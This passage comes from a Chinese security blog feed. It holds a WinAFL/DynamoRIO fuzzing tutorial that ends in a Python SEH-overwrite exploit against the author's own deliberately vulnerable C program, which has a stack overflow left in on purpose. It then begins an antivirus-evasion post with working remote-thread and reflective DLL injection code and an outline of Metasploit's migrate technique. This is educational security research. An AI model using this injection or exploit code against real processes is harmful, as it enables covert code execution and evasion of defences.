plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/googleprojectzero/winafl.git</span><br><span class="line">cd winafl</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">mkdir build_Win32</span><br><span class="line">mkdir build_x64</span><br></pre></td></tr></table></figure><ol><li><p>编译32位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; .. -A Win32 -DDynamoRIO_DIR=D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\cmake -DINTELPT=1 -DUSE_COLOR=1</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure><p>如果显示<code>drgui</code>不完整，返回去在生成就行了，看雪上的教程是没有问题的</p></li><li><p>编译64位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_x64\cmake&quot; -DINTELPT=1 -DUSE_COLOR=1</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure></li></ol><h1 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h1><h2 id="32位-2"><a class="markdownIt-Anchor" href="#32位-2"></a> 32位</h2><ol><li><p>首先进行插桩</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:: 接受用户输入</span><br><span class="line"><span class="built_in">set</span> /p target_module=traget excutable : </span><br><span class="line"><span class="built_in">set</span> /p target_offset=traget offset : </span><br><span class="line"><span class="built_in">set</span> /p sample=pins sample: </span><br><span class="line"></span><br><span class="line">:: 输出用户输入的内容</span><br><span class="line"><span class="built_in">echo</span> target_module, <span class="variable">%target_module%</span>!</span><br><span class="line"><span class="built_in">echo</span> target_offset, <span class="variable">%target_offset%</span>!</span><br><span class="line"><span class="built_in">echo</span> sample, <span class="variable">%sample%</span>!</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">D:\<span class="title">HackTools</span>\<span class="title">Fuzz</span>\<span class="title">__FuzzWork</span>\<span class="title">dynamorio</span>\<span class="title">build_Win32</span>\<span class="title">bin32</span>\<span class="title">drrun.exe</span> ^</span></span><br><span class="line"><span class="function">-<span class="title">c</span> <span class="title">D</span>:\<span class="title">HackTools</span>\<span class="title">Fuzz</span>\<span class="title">__FuzzWork</span>\<span class="title">winafl</span>\<span class="title">build_Win32</span>\<span class="title">bin</span>\<span class="title">Release</span>\<span class="title">winafl.dll</span> -<span class="title">debug</span> ^</span></span><br><span class="line"><span class="function">-<span class="title">target_module</span> %<span class="title">target_module</span>% ^</span></span><br><span class="line"><span class="function">-<span class="title">target_offset</span> %<span class="title">target_offset</span>% ^</span></span><br><span class="line"><span class="function">-<span class="title">fuzz_iterations</span> 10 -<span class="title">nargs</span> 2 -- ^</span></span><br><span class="line"><span class="function">%<span class="title">target_module</span>% %<span class="title">sample</span>%</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">test.exe .\in\password.txt</span><br></pre></td></tr></table></figure><p>查看生成的log文件，如果有<code>Everything appears to be running normally.</code>那么就是完成了</p></li><li><p>开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module test.exe ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">test.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ea80329361bc5efe5305e79b94370480.png" alt="image-20230719131211815" /></p></li></ol><h2 id="64位-2"><a class="markdownIt-Anchor" href="#64位-2"></a> 64位</h2><p>过程也差不多</p><p>先插桩</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">traget excutable : test.exe</span><br><span class="line">traget offset : 0x1200</span><br><span class="line">pins sample: .\in\input.bmp</span><br><span class="line">target_module, test.exe!</span><br><span class="line">target_offset, 0x1200!  </span><br><span class="line">sample, .\in\input.bmp!</span><br></pre></td></tr></table></figure><p>然后fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o .\out ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_x64\bin64&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module test.exe ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">test.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/916e80cff30a0ee3d94ceca18eb32ad4.png" alt="image-20230719134046975" /></p><h1 id="测试2-simplehunt"><a class="markdownIt-Anchor" href="#测试2-simplehunt"></a> 测试2 - SimpleHunt</h1><p>在之前我的博客写了windows下栈溢出的过程，这里我改写了下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *FileDir)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(FileDir,<span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Open Failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">vuln(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc HelloWorld.c -o HelloWorld</span><br></pre></td></tr></table></figure><p>没有任何保护，这里以32位举例</p><h2 id="fuzz"><a class="markdownIt-Anchor" href="#fuzz"></a> fuzz</h2><p>由于代码比较简单，不需要先生成覆盖率文件找到关键函数，所以首先还是插桩</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-target_module HelloWorld.exe ^</span><br><span class="line">-target_offset 0x16c4 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">HelloWorld.exe in\password.txt</span><br></pre></td></tr></table></figure><p>开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i &quot;D:\HackTools\Fuzz\WinAFLFuzz\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module HelloWorld.exe ^</span><br><span class="line">-target_module HelloWorld.exe ^</span><br><span class="line">-target_offset 0x16c4 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 2 -- ^</span><br><span class="line">HelloWorld.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ec9214e2a5aada0ddc6e74f956f60bf9.png" alt="image-20230719140624246" /></p><p>瞬间找到一个crash</p><h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> PoC</h2><p><img src="https://img.joe1sn.top/uploads/big/80b03780c4fcd5ad58467691a3664471.png" alt="image-20230719140746701" /></p><p>使用x32dbg进行调试</p><p><img src="https://img.joe1sn.top/uploads/big/ce1aa16c4a51fe8d5fe578c891edc509.png" alt="image-20230719141111547" /></p><p>刚好修改了EBP寄存器导出错误，很明显的栈溢出。</p><p>具体的EXP构造方法就是使用SEH加载shellcode，具体的在之前的文章已经写过了</p><p>写出exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x12c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">32</span>) <span class="comment">#0x1c</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\x9A\x24\x40\x00&quot;</span>    <span class="comment">#40249A</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x24\x06\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">32</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/04b0986fd3905d3622d739c4a5e3813d.gif" alt="output" /></p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p><p><a href="https://bbs.kanxue.com/thread-261323.htm">https://bbs.kanxue.com/thread-261323.htm</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记&lt;/p&gt;
&lt;p&gt;这里主要讲述WinAFL+DynamoRIO的Fuzz方法&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】DLL注入小结</title>
    <link href="https://joe1sn.eu.org/2023/07/17/dll-injector/"/>
    <id>https://joe1sn.eu.org/2023/07/17/dll-injector/</id>
    <published>2023-07-17T11:24:51.000Z</published>
    <updated>2023-07-22T00:55:11.113Z</updated>
    
    <content type="html"><![CDATA[<p>DLL 注入进化史</p><span id="more"></span><h1 id="远程线程调用注入"><a class="markdownIt-Anchor" href="#远程线程调用注入"></a> 远程线程调用注入</h1><p>这个是最简单的</p><p>这里我接受的是程序的进程<code>PID</code>和待注入DLL的路径<code>szPath</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DLLinjector::DllOnLoad</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>-&gt;<span class="built_in">Check</span>())&#123;</span><br><span class="line">wcout &lt;&lt; <span class="string">&quot;The Process or DLL file not found\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//向目标进程写入DLL的路径</span></span><br><span class="line">SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="keyword">this</span>-&gt;dwPid);</span><br><span class="line">LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, <span class="keyword">this</span>-&gt;szPath, <span class="built_in">wcslen</span>(<span class="keyword">this</span>-&gt;szPath)*<span class="number">2</span>+<span class="number">2</span>, &amp;dwWriteSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从ntdll导出 LoadLibraryA 函数</span></span><br><span class="line">HMODULE Ntdll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">LPVOID LoadLibraryBase = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    </span><br><span class="line">HANDLE hRemoteProcess = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryW,pAddress,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hRemoteProcess, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放资源</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pAddress, <span class="number">0x300</span>, MEM_COMMIT);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="built_in">FreeModule</span>(Ntdll);</span><br><span class="line"></span><br><span class="line">wcout &lt;&lt; <span class="string">&quot;injection complete\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ab29867d886c12b9b42013810ad19cbc.png" alt="image-20230717205213381" /></p><h1 id="反射dll注入"><a class="markdownIt-Anchor" href="#反射dll注入"></a> 反射DLL注入</h1><p>这里找了一张先知的图，上面说了反射DLL注入的流程，原文在这里<a href="https://xz.aliyun.com/t/11072">https://xz.aliyun.com/t/11072</a></p><p><img src="https://img.joe1sn.top/uploads/big/8ac2e3d0d3139da37de7067a9a9d8e51.png" alt="image-20230717210533079" /></p><p>最大的区别就是我们没有使用<code>LoadLibarary</code>这个函数，而是相当于自己写了一个DLL加载器</p><p>仔细观察过程就看得出来，<strong>远程线程调用注入</strong>写入的是DLL路径，然后创建远程调用<code>LoadLibarary</code>（LPTHREAD_START_ROUTINE）</p><p><strong>反射DLL注入</strong>是将整个文件解析过后，获得必要的dll句柄和函数为修复导入表做准备，分配一块新内存去取解析dll，并把pe头复制到新内存中和将各节复制到新内存中，修复导入表和重定向表，执行DllMain()函数。</p><p>群里聊到了进程迁移技术，msf上的migrate原理就是反射DLL注入</p><ol><li><p>读取metsrv.dll（metpreter payload模板dll）文件到内存中。</p></li><li><p>生成最终的payload。</p><p>a) msf生成一小段汇编migrate stub主要用于建立socket连接。</p><p>b) 将metsrv.dll的dos头修改为一小段汇编meterpreter_loader主要用于调用reflective loader函数和dllmain函数。在metsrv.dll的config block区填充meterpreter建立session时的配置信息。</p><p>c) 最后将migrate stub和修改后的metsrv.dll拼接在一起生成最终的payload。</p></li><li><p>向msf server发送migrate请求和payload。</p></li><li><p>msf向迁移目标进程分配一块内存并写入payload。</p></li><li><p>msf首先会创建的远程线程执行migrate stub，如果失败了，就会尝试用apc注入的方式执行migrate stub。migrate stub会调用meterpreter loader，meterpreter loader才会调用reflective loader。</p></li><li><p>reflective loader进行反射式dll注入。</p></li><li><p>最后msf client和msf server建立一个新的session。</p></li></ol><p>这里就不自己写了，参考的是<a href="https://github.com/stephenfewer/ReflectiveDLLInjection">https://github.com/stephenfewer/ReflectiveDLLInjection</a></p><p>首先需要描述的就是DLL的解析过程</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( !hProcess  || !lpBuffer || !dwLength )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if the library has a ReflectiveLoader...</span></span><br><span class="line">dwReflectiveLoaderOffset = <span class="built_in">GetReflectiveLoaderOffset</span>( lpBuffer );</span><br><span class="line"><span class="keyword">if</span>( !dwReflectiveLoaderOffset )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// alloc memory (RWX) in the host process for the image...</span></span><br><span class="line">lpRemoteLibraryBuffer = <span class="built_in">VirtualAllocEx</span>( hProcess, <span class="literal">NULL</span>, dwLength, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE ); </span><br><span class="line"><span class="keyword">if</span>( !lpRemoteLibraryBuffer )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// write the image into the host process...</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="built_in">WriteProcessMemory</span>( hProcess, lpRemoteLibraryBuffer, lpBuffer, dwLength, <span class="literal">NULL</span> ) )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add the offset to ReflectiveLoader() to the remote library address...</span></span><br><span class="line">lpReflectiveLoader = (LPTHREAD_START_ROUTINE)( (ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset );</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a remote thread in the host process to call the ReflectiveLoader!</span></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>( hProcess, <span class="literal">NULL</span>, <span class="number">1024</span>*<span class="number">1024</span>, lpReflectiveLoader, lpParameter, (DWORD)<span class="literal">NULL</span>, &amp;dwThreadId );</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">while</span>( <span class="number">0</span> );</span><br></pre></td></tr></table></figure><p><code>lpBuffer</code>就是读取到内存中的DLL的数据</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// uiNameArray = the address of the modules export directory entry</span></span><br><span class="line">uiNameArray = (UINT_PTR)&amp;((PIMAGE_NT_HEADERS)uiExportDir)-&gt;OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset of the export directory</span></span><br><span class="line">uiExportDir = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_DATA_DIRECTORY)uiNameArray)-&gt;VirtualAddress, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of name pointers</span></span><br><span class="line">uiNameArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNames, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">uiAddressArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the File Offset for the array of name ordinals</span></span><br><span class="line">uiNameOrdinals = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfNameOrdinals, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// get a counter for the number of exported functions...</span></span><br><span class="line">dwCounter = ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line"><span class="comment">// loop through all the exported functions to find the ReflectiveLoader</span></span><br><span class="line"><span class="keyword">while</span>( dwCounter-- )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> * cpExportedFunctionName = (<span class="type">char</span> *)(uiBaseAddress + <span class="built_in">Rva2Offset</span>( <span class="built_in">DEREF_32</span>( uiNameArray ), uiBaseAddress ));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">strstr</span>( cpExportedFunctionName, <span class="string">&quot;ReflectiveLoader&quot;</span> ) != <span class="literal">NULL</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// get the File Offset for the array of addresses</span></span><br><span class="line">uiAddressArray = uiBaseAddress + <span class="built_in">Rva2Offset</span>( ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)-&gt;AddressOfFunctions, uiBaseAddress );</span><br><span class="line"></span><br><span class="line"><span class="comment">// use the functions name ordinal as an index into the array of name pointers</span></span><br><span class="line">uiAddressArray += ( <span class="built_in">DEREF_16</span>( uiNameOrdinals ) * <span class="built_in">sizeof</span>(DWORD) );</span><br><span class="line"></span><br><span class="line"><span class="comment">// return the File Offset to the ReflectiveLoader() functions code...</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Rva2Offset</span>( <span class="built_in">DEREF_32</span>( uiAddressArray ), uiBaseAddress );</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// get the next exported function name</span></span><br><span class="line">uiNameArray += <span class="built_in">sizeof</span>(DWORD);</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the next exported function name ordinal</span></span><br><span class="line">uiNameOrdinals += <span class="built_in">sizeof</span>(WORD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p><code>GetReflectiveLoaderOffset</code>就是解析文件头找到DLL的导出表，如果发现<code>ReflectiveLoader</code>的函数，那么返回在<code>hProcess</code>的内存文件中的位置</p><p>然后回到<code>LoadRemoteLibraryR</code>使用<code>CreateRemoteThread</code>进行注入</p><p>关于RVA和VA的计算可以参考我很早写的一篇博客：<a href="https://www.jianshu.com/p/231206f9fbaf">PE文件结构中的RVA与RAW</a></p><p>现在可以看一下他的DLL是如何构造的</p><p>首先存在一个导出函数</p><p><img src="https://img.joe1sn.top/uploads/big/5f38a3c3481e227dd4bc7785f3ab41ca.png" alt="image-20230718084605818" 